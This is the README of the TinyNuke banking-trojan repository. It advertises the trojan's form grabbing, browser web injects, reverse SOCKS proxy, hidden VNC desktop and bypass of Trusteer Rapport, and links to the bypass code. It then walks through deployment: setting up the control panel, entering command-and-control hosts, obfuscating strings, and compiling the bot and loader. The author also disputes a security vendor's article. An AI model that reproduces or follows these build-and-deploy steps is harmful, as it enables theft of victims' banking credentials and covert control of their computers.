#TinyNuke Botnet

* * *


	This repository contains the source code of TinyNuke which is a zeus-style trojan.
    Coded on C++ (Bot, Injectors, Servers, API, etc.) and PHP (Control Panel)

> Note: If you have any questions - you can contact me at bakahadoken@protonmail.com by EMail or at www0rm@cock.li on Jabber (XMPP)

Trusteer Rapport News:
======================

In a tabloid-like article (https://securityintelligence.com/the-nukebot-trojan-a-bruised-ego-and-a-surprising-source-code-leak/)
IBM claims I never bypassed Trusteer without sources or proof while spewing lies about me.
Here is a little video to counter that statement: https://www.youtube.com/watch?v=co7T9CHxYZw
I had offered to help trusteer try to fix this problem weeks ago but they didn't seem to want any help
as I was stuck with tech support more centered for customers of their software then technical stuff.

You can see how easy it is to beat trusteer which makes 147m USD a year here:
https://github.com/HadokenCode/TinyNuke/blob/master/Utils.cpp#L524

Disclaimor:
===========

#####Some articles are claiming that I am a certain individual selling this bot on russian deep-web forums

###I am never infected anything with this project nor did I sell it or try to

Main Features:
==============

 - Formgrabber and Webinjects for Firefox, Internet Explorer and Chrome. Can inject x86 as well as x64 browsers.
 - Reverse SOCKS 4
 - HVNC like Hidden Desktop
 - Trusteer Bypass
 - 32Kb binary with obfuscated strings 20Kb without

Installation:
=============

 - [ ] To install the panel dump the db.sql file then login with the default panel credentials admin:pass and finally navigate to settings.php

		Panel does not support php running under CGI/FastCGI. You also need at least php version 5.4

 - [ ] Open TinyNuke.sln and provide your server Api.cpp like this:

   	Strs::host[0] = ENC_STR_A"127.0.0.1"END_ENC_STR;
   	Strs::host[1] = ENC_STR_A"backup-server"END_ENC_STR;
   	Strs::host[2] = 0;

 - [ ] To obfuscate strings between the ENC_STR_A and END_ENC_STR, backup Api.cpp then use the AutoEncrypt project, a binary is located in the root directory

 - [ ] Compile the Bot project for the x64 and x86 platforms and upload the binaries to the panel in the settings page

 - [ ] Upload your webinject file, format can be seen in private/injects.json in the panel folder if you have no WebInjects provide an empty JSON object "{}"

 - [ ] Compile the Loader project to get your PE file

		Usage and additional info can be found within the code.
        (HiddenDesktop/VNC Server Folder is HiddenDesktop
        Reverse SOCKS 4 Server is SocksServer)

Known Bugs:
===========

 - The "Top Hosts" feature was hacked together and should either be fixed or more probably removed.
